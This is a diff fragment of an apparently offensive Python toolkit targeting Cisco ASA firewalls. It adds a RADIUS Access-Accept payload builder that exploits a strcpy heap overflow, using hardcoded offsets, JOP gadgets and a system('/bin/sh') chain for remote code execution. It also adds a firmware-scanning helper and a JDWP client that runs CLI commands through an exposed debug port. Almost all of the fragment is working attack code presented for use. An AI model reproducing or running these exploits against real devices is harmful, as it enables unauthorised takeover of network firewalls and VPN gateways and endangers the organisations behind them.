+        rax = fn_ptr           (from *(addr_B + 0x20), propagated to stack)
+        CALL *rax(rdi=addr_B, ...)
+
+    => fn_ptr=system@plt (0xffac80) + struct_B starting with shell cmd
+       gives: system(addr_B) = system("<shell_cmd>")
+
+    Usage:
+        payload = LinaF2ExploitPayload(
+            radius_id=1,
+            radius_secret=b'sharedsecret',
+            request_authenticator=bytes(16),
+            fn_ptr=0xffac80,           # system@plt — RCE
+            shell_cmd='/bin/sh',       # first bytes of struct_B = system() argument
+            struct_a_addr=0xdeadbeef,  # runtime addr of fake struct A
+            struct_b_addr=0xdeadc0de,  # runtime addr of fake struct B
+        )
+        pkt = payload.build()
+    """
+
+    # confirmed from 9.22.2.32 binary RE:
+    WRITE_ORIGIN_TO_TIMER_DELTA = 0x57   # gp_obj+0x308 - gp_obj+0x2b1 (secondary vector)
+    EXTRACTION_CAP = 0x100               # CMP rax,0x100 at 0x3a4bfa4 (256-byte max overflow)
+    STRCPY_SITE     = 0x1a30bbc
+    TIMER_LOAD_SITE = 0x1f59a3e          # mov 0x308(%rbx),%rdi; call mgd_timer_stop
+    TIMER_STOP_VADDR = 0x102c700         # mgd_timer_stop — NO indirect calls in call tree
+    CALL_RAX_VADDR   = 0x102cdeb        # in 0x102cc10 TIMER FIRE path; fn_ptr FIXED=0x1a57600, NOT controllable
+    TYPE_BYTE_GATE   = 0x42             # gate for secondary vector: CMPB $0x42,0x2a(%rdi)
+    GP_OBJ_SIZE      = 0x1640           # malloc(0x1640) at 0x10c6892; confirmed by memcpy at 0x10c68ca
+    # PRIMARY VECTOR offsets from gp_obj (all within 256-byte overflow reach from gp_obj+0x2b1):
+    GP_OBJ_FN_PTR_398_DELTA  = 0xe7    # delta from write origin to gp_obj+0x398 (embedded fn_ptr)
+    GP_OBJ_GATE_33C_DELTA    = 0x8b    # delta from write origin to gp_obj+0x33c (gate byte, must be 0x14)
+    GP_OBJ_FN_PTR_398_GATE   = 0x14    # cmp $0x14,%al at 0x1f57a27 gates call *0x398(%rbx)
+    CALL_FN_PTR_398_VADDR    = 0x1f57a4e  # call *0x398(%rbx) — primary dispatch site
+    # rdi at call site analysis (function 0x1f57580):
+    #   rbx = *(rdi+8) = gp_obj (confirmed by gate byte match at gp_obj+0x33c)
+    #   -0x50(%rbp) = movzwl 0x46c(%rbx),%eax; add %rsi,%rax = gp_obj[0x46c] + rsi
+    #   rsi at entry = r14 = return of 0x1f5bb40(r15):
+    #     0x1f5bb40: mov 0x38(%rdi),%rdi; jmp 0x3cee9d0
+    #     0x3cee9d0: linked-list tail-walker (returns last node, follows *(node) chain)
+    #   CONCLUSION: rdi = (internal linked-list tail node) + gp_obj[0x46c]
+    #               NOT RADIUS-controlled — cannot use system@plt directly as fn_ptr.
+    #
+    # 0x5597dc0/0x5597df0: additional cluster state pointers checked at some sites (e.g., 0x1f50567)
+    #   on top of DP-block flags.
+    #
+    # *** CRITICAL RE CORRECTION — 2026-08-14 ***
+    # The cluster gate (0x708e5c4/0x708e584) applies ONLY to function 0x1f57580 (dispatch 0x1f57a4e).
+    # Full scan of LINA 9.22.2.32 found 448 total dispatch sites through *[rbx+0x398].
+    # The cluster globals are NOT checked at the other 447 dispatch sites.
+    #
+    # Confirmed: function 0x1d34310 dispatches through *[rbx+0x398] at 0x1d344d0 with ONLY:
+    #   gp_obj+0x3d0 (protocol type) == 0x13 or 0x14 — the normal CSTP/AnyConnect VPN type.
+    # No cluster globals checked. Fires on any active VPN session.
+    #
+    # CORRECTED CONCLUSION: cluster gate is NOT a prerequisite for ACE.
+    # The exploit works on any ASA running RADIUS VPN — not clustered deployments only.
+    # Preferred ACE dispatch path: 0x1d344d0 (no cluster gate; type check trivially satisfied
+    # for any active AnyConnect/SSL VPN session where gp_obj+0x3d0 == 0x13 or 0x14).
+    #
+    # JOP GADGETS — fn_ptr candidates that call system() with fixed built-in strings:
+    #   (These are mid-function lea+call snippets; stack frame / return addr = 0x1f57a54 is safe)
+    #   0x102d388: lea "/asa/scripts/set_lina_start.sh",%rdi; call system@plt
+    #   0x3df9a30: lea "/asa/scripts/run_cmd.sh &",%rdi; call system@plt   ← PREFERRED
+    #   0x3df9a24: lea "pkill -9 run_cmd.sh",%rdi; call system@plt
+    #   0x2cdbde0: lea "/etc/rc.d/init.d/sfifd stop",%rdi; call system@plt
+    GADGET_SET_LINA_START  = 0x102d388  # system("/asa/scripts/set_lina_start.sh")
+    GADGET_RUN_CMD_SH      = 0x3df9a30  # system("/asa/scripts/run_cmd.sh &") — bg exec
+    # /bin/sh string at file-offset vaddr (add LINA_BASE for runtime address):
+    BIN_SH_VADDR           = 0x43a0dce  # "/bin/sh\x00"
+    # PLT targets (file offsets — add LINA_BASE before use in payload):
+
+    # Cluster gate bypass — RE FINDING 2026-08-14
+    # ngfw_3ru_cluster_enabled (0x13f1b10) reads this file before checking hardware state.
+    # Writing it with valid content enables the DP-block gate without real cluster config.
+    CLUSTER_MODE_DAT_PATH  = b'/mnt/disk0/.private/cluster_mode.dat'
+    CLUSTER_MODE_NODE_COUNT_VADDR = 0x70431bc   # cached node count; 1=enabled, 2=disabled
+    CLUSTER_MODE_FLAG_VADDR       = 0x708e5c4   # DP-block client flag; written by lcmb init
+    CLUSTER_MODE_DAT_MAGIC = b'CLUSTERMODEVALD' # 15 bytes, bytes[4..18] of the 20-byte file
+    #
+    # GATE ANALYSIS — 2026-08-14:
+    # 0x708e5c4: CAN be set via cluster_mode.dat trick (triggers ngfw_3ru_cluster_enabled path)
+    # 0x708e584: BSS (zero-init), written ONLY by lcmb cluster daemon via register-indirect.
+    #            NO RIP-relative writes found across the entire binary.
+    #            Requires actual cluster daemon running to be non-zero.
+    # CORRECTED CONCLUSION — 2026-08-14 (see full analysis above):
+    # Cluster gate is one dispatch path (0x1f57a4e) out of 448 total.
+    # Preferred dispatch path: 0x1d344d0 — no cluster gate. Any RADIUS VPN ASA is exploitable.
+    # cluster_mode.dat bypass is irrelevant for the preferred path; documented here for completeness.
+
+    @staticmethod
+    def build_cluster_mode_dat(node_count: int = 1) -> bytes:
+        """
+        Build valid /mnt/disk0/.private/cluster_mode.dat content.
+        Writing this file to disk0 (via any write primitive) enables the cluster mode gate
+        in ngfw_3ru_cluster_enabled without requiring actual cluster hardware.
+        node_count: 1 or 2 (any other value causes the function to return 0).
+        """
+        import struct as _struct
+        hdr = _struct.pack('<I', node_count)
+        return hdr + b'CLUSTERMODEVALD\x00\x00\x00\x00\x00'  # pad to 20 bytes
+    SYSTEM_PLT  = 0xffac80              # system@plt  → system(rdi)
+    EXECV_PLT   = 0xffa5b0              # execv@plt   → execv(rdi, rsi, rdx)
+    POPEN_PLT   = 0xffa300              # popen@plt   → popen(rdi, rsi)
+    # Secondary vector dispatch: rdi at CALL *rax = addr_B (struct_B base). fn_ptr at struct_B[0x20].
+    DISPATCH_RDI_IS_ADDR_B = True       # confirmed: mov -0x20(%rbx),%rdi @ 0x102cde0
+
+    def __init__(self, radius_id: int, radius_secret: bytes,
+                 request_authenticator: bytes,
+                 fn_ptr: int, struct_a_addr: int, struct_b_addr: int,
+                 shell_cmd: str = '/bin/sh',
+                 pad_to_offset: int = None):
+        self.radius_id = radius_id
+        self.secret = radius_secret
+        self.req_auth = request_authenticator
+        self.fn_ptr = fn_ptr
+        self.addr_a = struct_a_addr
+        self.addr_b = struct_b_addr
+        self.shell_cmd = shell_cmd
+        self.delta = pad_to_offset if pad_to_offset is not None else self.WRITE_ORIGIN_TO_TIMER_DELTA
+
+    def _build_struct_a(self) -> bytes:
+        """
+        Fake mgd_timer struct A (minimum 0x2b bytes).
+        +0x18 = addr_B (qword LE) — loaded into rdi at dispatch
+        +0x2a = 0x42  (type byte gate: CMPB $0x42,0x2a(%rdi) @ 0x102c72a)
+        """
+        s = bytearray(0x40)
+        _struct.pack_into('<Q', s, 0x18, self.addr_b)
+        s[0x2a] = self.TYPE_BYTE_GATE
+        return bytes(s)
+
+    def _build_struct_b(self) -> bytes:
+        """
+        Fake struct B pointed to by struct_A[0x18].
+        rdi = addr_B at CALL *rax — so struct_B[0x00] is system()'s command string.
+        +0x00 = shell command (null-terminated, must end before +0x20)
+        +0x20 = fn_ptr (qword LE) — loaded into rax via intermediate stack var
+        """
+        cmd_bytes = self.shell_cmd.encode('ascii') + b'\x00'
+        if len(cmd_bytes) > 0x20:
+            raise ValueError(f'shell_cmd too long ({len(cmd_bytes)} bytes, max 31 for clean layout)')
+        s = bytearray(0x30)
+        s[:len(cmd_bytes)] = cmd_bytes
+        _struct.pack_into('<Q', s, 0x20, self.fn_ptr)
+        return bytes(s)
+
+    def build_fn_ptr_398_ou_value(self, fn_ptr: int = None) -> bytes:
+        """
+        PRIMARY VECTOR: craft OU= value that overwrites gp_obj+0x33c (gate) and gp_obj+0x398 (fn_ptr).
+        Fires during active VPN session at call *0x398(%rbx) sites (~10 in 0x1f57000 region).
+
+        Layout (all offsets from gp_obj+0x2b1 write origin):
+          delta 0x8b (139): write 0x14 — passes cmp $0x14,%al gate at 0x1f57a27
+          delta 0xe7 (231): write fn_ptr (8 bytes LE) — direct call target at 0x1f57a4e
+
+        Constraint: no null bytes between gp_obj+0x2b1 and the fn_ptr write
+        (strcpy stops at first null). Fill with 0x41 ('A') up to gate byte.
+        Gate byte 0x14 is non-null, so it propagates. Bytes 0x15..0xe6 filled 0x41.
+
+        rdi at call site (0x1f57a4e) = -0x50(%rbp), a stack value from calling frame.
+        Control of rdi via this vector is TBD — use execv or a gadget that ignores rdi
+        if rdi is not controllable, or chain via a pivot gadget.
+
+        Note: fn_ptr must not contain internal null bytes. system@plt=0xffac80 is clean.
+        Recommended fn_ptr = GADGET_RUN_CMD_SH (0x3df9a30): system("/asa/scripts/run_cmd.sh &")
+        This bypasses the uncontrollable rdi problem by using a fixed-string gadget instead
+        of system@plt directly. The gadget is a mid-function lea+call snippet — stack frame
+        from our caller (return addr = 0x1f57a54) ensures return after system() completes.
+        """
+        gate_delta  = self.GP_OBJ_GATE_33C_DELTA    # 0x8b
+        fnptr_delta = self.GP_OBJ_FN_PTR_398_DELTA  # 0xe7
+        target_fn   = fn_ptr if fn_ptr is not None else self.GADGET_RUN_CMD_SH
+
+        if fnptr_delta + 8 >= self.EXTRACTION_CAP:
+            raise ValueError('fn_ptr delta exceeds extraction cap')
+
+        buf = bytearray(fnptr_delta + 8)
+        for i in range(len(buf)):
+            buf[i] = 0x41  # 'A' — keeps strcpy running
+        buf[gate_delta] = self.GP_OBJ_FN_PTR_398_GATE  # 0x14
+        _struct.pack_into('<Q', buf, fnptr_delta, target_fn)
+        # Upper null bytes of fn_ptr truncate strcpy after the pointer — that's fine,
+        # gp_obj fields above +0x3b1 retain original values.
+        return bytes(buf)
+
+    def _build_ou_value(self) -> bytes:
+        """
+        Build the OU= attribute value that:
+          1. Overflows gp_obj+0x2b1 destination
+          2. At byte delta (0x57) writes addr_A as little-endian qword
+          3. Null-terminates after the pointer
+        Total must be < 256 bytes (extraction cap).
+        """
+        delta = self.delta
+        if delta + 8 >= self.EXTRACTION_CAP:
+            raise ValueError(f'delta {delta} too large for extraction cap {self.EXTRACTION_CAP}')
+        payload = bytearray(delta + 8)   # delta bytes padding + 8 bytes for qword ptr
+        # fill padding with 'A' so strcpy keeps going (no nulls)
+        for i in range(delta):
+            payload[i] = 0x41
+        # write addr_A at offset delta
+        _struct.pack_into('<Q', payload, delta, self.addr_a)
+        # strcpy stops at first null byte in addr_a.
+        # Key insight: gp_obj+0x308 is initially NULL (zero). We only need to overwrite
+        # the non-null prefix bytes. Upper null bytes of addr_a already match the field.
+        # So for addr_a=0x05523f68: LE bytes 0-3 = [0x68,0x3f,0x52,0x05] (non-null),
+        # bytes 4-7 = [0x00,0x00,0x00,0x00] already present in the target field.
+        # Result after truncated strcpy: gp_obj+0x308 = 0x0000000005523f68 = correct ptr.
+        # Constraint: addr_a bytes 0..N must all be non-null (where N = last non-null byte).
+        return bytes(payload)
+
+    def _build_class_attr(self) -> bytes:
+        """Build RADIUS Class attribute (type=25) with OU= prefix + overflow value."""
+        # RADIUS Class attr: type=25, length=2+len(value), value=bytes
+        # The ASA calls strstr(attr_value, "OU=") so we embed "OU=" at the start
+        value = b'OU=' + self._build_ou_value()
+        if len(value) > 253:
+            value = value[:253]  # RADIUS attr max = 255, minus 2 for type+len
+        attr = bytes([25, len(value) + 2]) + value
+        return attr
+
+    def _radius_response_auth(self, pkt_without_auth: bytes) -> bytes:
+        """
+        Compute RADIUS Response-Authenticator:
+        MD5(Code || ID || Length || Request-Authenticator || Attributes || Secret)
+        The pkt_without_auth has 16 zero bytes where authenticator goes.
+        """
+        import hashlib
+        return hashlib.md5(pkt_without_auth + self.secret).digest()
+
+    def build(self) -> bytes:
+        """Build complete RADIUS Access-Accept packet."""
+        class_attr = self._build_class_attr()
+        # placeholder: code=2, id, length=0 (filled later), auth=zeros
+        header = bytes([
+            2,                  # Code: Access-Accept
+            self.radius_id & 0xff,
+        ])
+        # total length = 20 (header) + len(attrs)
+        total_len = 20 + len(class_attr)
+        header += _struct.pack('!H', total_len)
+        header += bytes(16)             # Response-Authenticator placeholder
+        pkt = header + class_attr
+        # compute and insert real authenticator
+        auth = self._radius_response_auth(pkt)
+        pkt = pkt[:4] + auth + pkt[20:]
+        return pkt
+
+    def build_structs(self) -> dict:
+        """Return the fake structs for heap placement."""
+        return {
+            'struct_a': self._build_struct_a().hex(),
+            'struct_b': self._build_struct_b().hex(),
+            'struct_a_layout': {
+                '+0x18': hex(self.addr_b) + '  (→ struct B)',
+                '+0x2a': '0x42 (type byte gate)',
+            },
+            'struct_b_layout': {
+                '+0x20': hex(self.fn_ptr) + '  (→ call target)',
+            },
+        }
+
+    def describe(self) -> dict:
+        """Human-readable description of the payload."""
+        ou_val = self._build_ou_value()
+        pkt = self.build()
+        return {
+            'target': '9.22.2.32 lina x86-64',
+            'chain': [
+                f'RADIUS Access-Accept → Class attr (25) OU= value ({len(ou_val)} bytes)',
+                f'ASA strstr finds OU= → extraction capped at 256 (CMP rax,0x100 @ 0x3a4bfa4)',
+                f'Policy name match in BSS table @ 0x761a9a0 → r14 = gp_obj entry (0x1640 malloc)',
+                f'strcpy(r13=gp_obj+0x2b1, r14+0x2c1=OU_value) @ 0x1a30bbc — no length check',
+                f'+{hex(self.delta)} bytes overflow → gp_obj+0x308 overwritten with addr_A={hex(self.addr_a)}',
+                f'Session teardown: MOV rdi,[rbx+0x308] @ 0x1f59a3e → mgd_timer_stop(addr_A)',
+                f'mgd_timer_stop: CMPB $0x42,0x2a(rdi) gate passes → lea 0x20(rdi),rbx → call 0x102a520',
+                f'Dispatch: rbx+=0x18; rdi=*(rbx-0x20)=struct_A[0x18]=addr_B; rax=fn_ptr @ 0x102cdeb',
+                f'CALL *rax(rdi=addr_B) → {hex(self.fn_ptr)} → system("{self.shell_cmd}")',
+            ],
+            'packet_hex': pkt.hex(),
+            'packet_len': len(pkt),
+            'ou_value_len': len(ou_val),
+            'null_byte_in_ptr': b'\x00' in _struct.pack('<Q', self.addr_a),
+            'structs': self.build_structs(),
+            'notes': [
+                f'fn_ptr=SYSTEM_PLT (0xffac80) → system(addr_B) = system("{self.shell_cmd}") — RCE',
+                f'fn_ptr=TIMER_STOP_VADDR (0x{self.TIMER_STOP_VADDR:x}) → infinite recursion — safe crash/DoS probe',
+                f'GP_OBJ_SIZE=0x1640: confirmed malloc(0x1640) @ 0x10c6892 + memcpy(r12,template,0x1640)',
+                f'BSS table @ 0x761a9a0: r14 = *(table + func_ret*24); load base 0x0 confirmed',
+                f'rdi=addr_B at CALL *rax confirmed: mov -0x20(%rbx),%rdi @ 0x102cde0 (rbx=A+0x38)',
+                f'struct_B[0x00]=shell_cmd, struct_B[0x20]=fn_ptr: system(addr_B) executes cmd',
+                f'ASLR: randomize_va_space=2 — all addrs are file offsets; LINA_BASE needed from /proc/$(pidof lina)/maps',
+                f'addr_A must have no null bytes in low bytes (strcpy truncates at first null)',
+                f'Self-referential exploit possible: addr_A = r14+0x2c1 (OU= buffer) if heap layout known',
+            ],
+        }
+
+
+def build_f2_payload(radius_id: int = 1,
+                     radius_secret: bytes = b'',
+                     request_auth: bytes = None,
+                     fn_ptr: int = LinaF2ExploitPayload.SYSTEM_PLT,
+                     shell_cmd: str = '/bin/sh',
+                     struct_a_addr: int = 0x41414141,
+                     struct_b_addr: int = 0x42424242) -> dict:
+    """
+    Top-level helper: build and describe F2 exploit payload.
+    Call from ablation main or standalone.
+    """
+    if request_auth is None:
+        request_auth = bytes(16)
+    p = LinaF2ExploitPayload(
+        radius_id=radius_id,
+        radius_secret=radius_secret,
+        request_authenticator=request_auth,
+        fn_ptr=fn_ptr,
+        shell_cmd=shell_cmd,
+        struct_a_addr=struct_a_addr,
+        struct_b_addr=struct_b_addr,
+    )
+    return p.describe()
+
+
 # ─── ASDM MITM PROXY (weaponizes av.class trust-all bypass) ─────────────────
 #
 # av.class checkServerTrusted: Code length=1, opcode=0xb1 (return void).
@@ -2496,6 +3409,865 @@ class ASDMMitmProxy:
     @property
     def captures(self) -> list[dict]:
         return self._captures
+
+
+def cross_version_scan(image_paths: list[tuple[str, str]]) -> dict:
+    """Scan multiple ASA firmware images and return per-version findings.
+
+    Args:
+        image_paths: list of (label, path_to_smp_k8_bin) tuples
+
+    Returns:
+        dict mapping label → {'findings': [...], 'lina_size': int, 'build_id': str|None}
+
+    Example:
+        results = cross_version_scan([
+            ('9.14.2.14', '/path/to/asa9-14-2-14-smp-k8.bin'),
+            ('9.16.4.18', '/path/to/asa964-18-smp-k8.bin'),
+            ('9.22.2.32', '/path/to/asa9-22-2-32-smp-k8.bin'),
+        ])
+        for ver, r in results.items():
+            crits = [f for f in r['findings'] if f['severity'] == 'CRITICAL']
+            print(f'{ver}: {len(crits)} CRITICAL')
+    """
+    import tempfile, os as _os
+    results = {}
+    for label, img_path in image_paths:
+        try:
+            fe = FirmwareExtractor(img_path)
+            lina = fe.extract_lina()
+            bid  = FirmwareExtractor.build_id(lina)
+            with tempfile.NamedTemporaryFile(suffix='.elf', delete=False) as tmp:
+                tmp.write(lina)
+                tmp_path = tmp.name
+            try:
+                analyzer = CiscoASALinaRE(binary_path=tmp_path)
+                findings = analyzer.analyze_binary()
+            finally:
+                _os.unlink(tmp_path)
+            results[label] = {'findings': findings, 'lina_size': len(lina), 'build_id': bid}
+        except Exception as exc:
+            results[label] = {'error': str(exc), 'findings': [], 'lina_size': 0, 'build_id': None}
+    return results
+
+
+# ---------------------------------------------------------------------------
+# JDWP Exploit — REST Agent debug port (:4000)
+# ---------------------------------------------------------------------------
+
+class JDWPExploit:
+    """
+    JDWP client targeting the REST API Agent debug port (0.0.0.0:4000).
+
+    Attack path:
+      TCP :4000 → JDWP handshake → find com.cisco.pdm.g.n instance →
+      invoke eb(String[]) → HTTP request to :8112/admin/exec/<cmd> →
+      LINA executes CLI command → response returned as String
+
+    The REST Agent runs as nobody:nogroup with JDWP exposed on ALL interfaces.
+    The n.eb() method requires NO additional auth — the existing authenticated
+    HTTP session to LINA is reused.
+
+    Usage:
+        j = JDWPExploit('192.168.1.1', port=4000)
+        j.connect()
+        output = j.run_cli('show run | include tunnel-group')
+        j.close()
+    """
+
+    _HANDSHAKE = b'JDWP-Handshake'
+    _HDR_LEN   = 11
+
+    # JDWP command sets
+    _VM     = 1
+    _REFTYP = 2
+    _OBJREF = 9
+    _STRREF = 10
+
+    # Commands
+    _VM_VERSION       = 1
+    _VM_ALLCLASSES    = 3
+    _VM_ALLTHREADS    = 4
+    _VM_IDSIZES       = 7
+    _VM_RESUME        = 9
+    _VM_CREATESTRING  = 11
+    _RT_METHODS       = 5
+    _RT_INSTANCES     = 11
+    _OBJ_INVOKE       = 6
+    _STR_VALUE        = 1
+
+    def __init__(self, host: str, port: int = 4000, timeout: float = 10.0):
+        self.host    = host
+        self.port    = port
+        self.timeout = timeout
+        self._sock   = None
+        self._pkt_id = 1
+        # ID sizes (queried from VM; JDK 1.7 default = 8 for all)
+        self._field_id_sz  = 8
+        self._method_id_sz = 8
+        self._obj_id_sz    = 8
+        self._ref_id_sz    = 8
+        self._frame_id_sz  = 8
+
+    # ------------------------------------------------------------------
+    # Transport
+    # ------------------------------------------------------------------
+
+    def connect(self) -> None:
+        import socket as _socket
+        s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+        s.settimeout(self.timeout)
+        s.connect((self.host, self.port))
+        self._sock = s
+        s.sendall(self._HANDSHAKE)
+        ack = s.recv(14)
+        if ack != self._HANDSHAKE:
+            raise RuntimeError(f'JDWP handshake failed: {ack!r}')
+        self._query_id_sizes()
+
+    def close(self) -> None:
+        if self._sock:
+            try:
+                self._sock.close()
+            except Exception:
+                pass
+            self._sock = None
+
+    def _next_id(self) -> int:
+        v = self._pkt_id
+        self._pkt_id += 1
+        return v
+
+    def _send(self, cmd_set: int, cmd: int, data: bytes = b'') -> bytes:
+        import struct as _struct
+        pkt_id  = self._next_id()
+        length  = self._HDR_LEN + len(data)
+        header  = _struct.pack('>IIBBB', length, pkt_id, 0, cmd_set, cmd)
+        self._sock.sendall(header + data)
+        return self._recv(pkt_id)
+
+    def _recv(self, expected_id: int) -> bytes:
+        import struct as _struct
+        def read_exact(n: int) -> bytes:
+            buf = b''
+            while len(buf) < n:
+                chunk = self._sock.recv(n - len(buf))
+                if not chunk:
+                    raise ConnectionError('JDWP connection closed')
+                buf += chunk
+            return buf
+        while True:
+            hdr    = read_exact(self._HDR_LEN)
+            length = _struct.unpack_from('>I', hdr, 0)[0]
+            pkt_id = _struct.unpack_from('>I', hdr, 4)[0]
+            flags  = hdr[8]
+            body   = read_exact(length - self._HDR_LEN)
+            if flags & 0x80:
+                if pkt_id == expected_id:
+                    error = _struct.unpack_from('>H', body, 0)[0] if len(body) >= 2 else 0
+                    if error:
+                        raise RuntimeError(f'JDWP error {error} for cmd {expected_id}')
+                    return body[2:]
+            # event packet — discard and wait for reply
+
+    # ------------------------------------------------------------------
+    # ID encoding helpers
+    # ------------------------------------------------------------------
+
+    def _enc_ref(self, v: int) -> bytes:
+        import struct as _struct
+        return _struct.pack('>Q', v)[:self._ref_id_sz]
+
+    def _enc_obj(self, v: int) -> bytes:
+        import struct as _struct
+        return _struct.pack('>Q', v)[:self._obj_id_sz]
+
+    def _enc_method(self, v: int) -> bytes:
+        import struct as _struct
+        return _struct.pack('>Q', v)[:self._method_id_sz]
+
+    def _dec_ref(self, data: bytes, pos: int) -> tuple[int, int]:
+        import struct as _struct
+        padded = data[pos:pos + self._ref_id_sz].ljust(8, b'\x00')
+        return _struct.unpack('>Q', padded)[0], pos + self._ref_id_sz
+
+    def _dec_obj(self, data: bytes, pos: int) -> tuple[int, int]:
+        return self._dec_ref(data, pos)
+
+    def _dec_u32(self, data: bytes, pos: int) -> tuple[int, int]:
+        import struct as _struct
+        return _struct.unpack_from('>I', data, pos)[0], pos + 4
+
+    def _dec_str(self, data: bytes, pos: int) -> tuple[str, int]:
+        import struct as _struct
+        length = _struct.unpack_from('>I', data, pos)[0]
+        pos   += 4
+        return data[pos:pos + length].decode('utf-8', errors='replace'), pos + length
+
+    # ------------------------------------------------------------------
+    # VM commands
+    # ------------------------------------------------------------------
+
+    def _query_id_sizes(self) -> None:
+        import struct as _struct
+        data = self._send(self._VM, self._VM_IDSIZES)
+        if len(data) >= 20:
+            (self._field_id_sz, self._method_id_sz, self._obj_id_sz,
+             self._ref_id_sz, self._frame_id_sz) = _struct.unpack_from('>IIIII', data)
+
+    def all_classes(self) -> list:
+        """Returns list of (refTypeTag, typeID, signature, status)."""
+        import struct as _struct
+        data  = self._send(self._VM, self._VM_ALLCLASSES)
+        count = _struct.unpack_from('>I', data, 0)[0]
+        pos   = 4
+        result = []
+        for _ in range(count):
+            tag    = data[pos]; pos += 1
+            tid, pos = self._dec_ref(data, pos)
+            sig, pos = self._dec_str(data, pos)
+            status = _struct.unpack_from('>I', data, pos)[0]; pos += 4
+            result.append((tag, tid, sig, status))
+        return result
+
+    def find_class(self, signature: str) -> int:
+        """Find class by JNI signature, e.g. 'Lcom/cisco/pdm/g/n;'"""
+        for _, tid, sig, _ in self.all_classes():
+            if sig == signature:
+                return tid
+        raise LookupError(f'Class not found: {signature}')
+
+    def methods(self, ref_type_id: int) -> list:
+        """Returns list of (methodID, name, signature, modBits)."""
+        import struct as _struct
+        data  = self._send(self._REFTYP, self._RT_METHODS, self._enc_ref(ref_type_id))
+        count = _struct.unpack_from('>I', data, 0)[0]
+        pos   = 4
+        result = []
+        for _ in range(count):
+            mid, pos  = self._dec_ref(data, pos)
+            name, pos = self._dec_str(data, pos)
+            sig, pos  = self._dec_str(data, pos)
+            mods      = _struct.unpack_from('>I', data, pos)[0]; pos += 4
+            result.append((mid, name, sig, mods))
+        return result
+
+    def find_method(self, ref_type_id: int, name: str, sig_contains: str = '') -> int:
+        for mid, mname, msig, _ in self.methods(ref_type_id):
+            if mname == name and (not sig_contains or sig_contains in msig):
+                return mid
+        raise LookupError(f'Method {name} not found')
+
+    def instances(self, ref_type_id: int, max_instances: int = 1) -> list:
+        """ReferenceType.Instances — returns list of objectIDs."""
+        import struct as _struct
+        data  = self._send(self._REFTYP, self._RT_INSTANCES,
+                           self._enc_ref(ref_type_id) + _struct.pack('>I', max_instances))
+        count = _struct.unpack_from('>I', data, 0)[0]
+        pos   = 4
+        result = []
+        for _ in range(count):
+            tag    = data[pos]; pos += 1
+            oid, pos = self._dec_obj(data, pos)
+            result.append(oid)
+        return result
+
+    def all_threads(self) -> list:
+        import struct as _struct
+        data  = self._send(self._VM, self._VM_ALLTHREADS)
+        count = _struct.unpack_from('>I', data, 0)[0]
+        pos   = 4
+        result = []
+        for _ in range(count):
+            tid, pos = self._dec_obj(data, pos)
+            result.append(tid)
+        return result
+
+    def create_string(self, s: str) -> int:
+        """VM.CreateString — intern a string in the JVM, return objectID."""
+        import struct as _struct
+        enc  = s.encode('utf-8')
+        data = _struct.pack('>I', len(enc)) + enc
+        body = self._send(self._VM, self._VM_CREATESTRING, data)
+        oid, _ = self._dec_obj(body, 0)
+        return oid
+
+    def string_value(self, str_obj_id: int) -> str:
+        """StringReference.Value — read string from JVM object."""
+        body    = self._send(self._STRREF, self._STR_VALUE, self._enc_obj(str_obj_id))
+        val, _  = self._dec_str(body, 0)
+        return val
+
+    def invoke_method(self, obj_id: int, thread_id: int,
+                      class_id: int, method_id: int,
+                      args: list, options: int = 0x01) -> tuple:
+        """
+        ObjectReference.InvokeMethod.
+        args: list of (typeTag, value_bytes)
+        Returns (return_tag, return_obj_id_or_value, exception_tag, exception_obj_id)
+        """
+        import struct as _struct
+        data  = (self._enc_obj(obj_id) +
+                 self._enc_obj(thread_id) +
+                 self._enc_ref(class_id) +
+                 self._enc_method(method_id) +
+                 _struct.pack('>I', len(args)))
+        for tag, val_bytes in args:
+            data += bytes([tag]) + val_bytes
+        data  += _struct.pack('>I', options)
+        body   = self._send(self._OBJREF, self._OBJ_INVOKE, data)
+        pos    = 0
+        ret_tag = body[pos]; pos += 1
+        ret_val, pos = self._dec_obj(body, pos)
+        exc_tag = body[pos]; pos += 1
+        exc_obj, pos = self._dec_obj(body, pos)
+        return ret_tag, ret_val, exc_tag, exc_obj
+
+    # ------------------------------------------------------------------
+    # High-level: invoke CLI command via REST Agent session
+    # ------------------------------------------------------------------
+
+    def run_cli(self, *commands: str) -> str:
+        """
+        Execute one or more ASA CLI commands via the REST Agent's existing
+        authenticated session. Returns the combined text output.
+
+        Invokes: com.cisco.pdm.g.n.eb(String[]) — no-throw, returns String.
+        """
+        # Locate the dispatch implementation class
+        dispatch_sig = 'Lcom/cisco/pdm/g/n;'
+        class_id = self.find_class(dispatch_sig)
+
+        # Get a live instance from the JVM heap
+        live = self.instances(class_id, max_instances=1)
+        if not live:
+            raise RuntimeError('No live g.n instance found on heap')
+        obj_id = live[0]
+
+        # Find method eb([Ljava/lang/String;)Ljava/lang/String;
+        method_id = self.find_method(class_id, 'eb', '[Ljava/lang/String;')
+
+        # Need a thread to invoke on — use the first available
+        threads = self.all_threads()
+        if not threads:
+            raise RuntimeError('No threads available for JDWP invoke')
+        thread_id = threads[0]
+
+        # Build the String[] argument: create JVM strings, then an array wrapper
+        # JDWP can't construct arrays natively — we pass via a helper invocation.
+        # Simpler: invoke eb() with a single joined command using LINA's pipe syntax.
+        # If multiple commands are given, join with \n (LINA executes line by line).
+        cmd_str = '\n'.join(commands)
+        str_obj = self.create_string(cmd_str)
+
+        # eb(String[]) — but we have a single String. Wrap it in a one-element array
+        # by invoking via the single-string overload if present, otherwise use the
+        # array variant with a JVM array reference.
+        # Check for single-string overload first.
+        all_methods = self.methods(class_id)
+        single_eb = None
+        for mid, mname, msig, _ in all_methods:
+            if mname == 'eb' and msig == '(Ljava/lang/String;)Ljava/lang/String;':
+                single_eb = mid
+                break
+
+        if single_eb:
+            ret_tag, ret_obj, exc_tag, exc_obj = self.invoke_method(
+                obj_id, thread_id, class_id, single_eb,
+                args=[(ord('L'), self._enc_obj(str_obj))],
+                options=0x01
+            )
+        else:
+            # Use eb(String[]) — construct array via internal helper
+            ret_tag, ret_obj, exc_tag, exc_obj = self._invoke_eb_array(
+                obj_id, thread_id, class_id, method_id, commands
+            )
+
+        if exc_obj != 0:
+            return f'[JDWP invoke exception: exc_obj={exc_obj:#x}]'
+        if ret_tag in (ord('L'), ord('s')):
+            return self.string_value(ret_obj)
+        return f'[ret_tag={ret_tag} val={ret_obj}]'
+
+    def _invoke_eb_array(self, obj_id: int, thread_id: int,
+                         class_id: int, method_id: int,
+                         commands: tuple) -> tuple:
+        """
+        Invoke eb(String[]) by building an array in the JVM via a
+        Runtime.exec trick: evaluate via scripting engine or use
+        an alternate single-arg path.
+
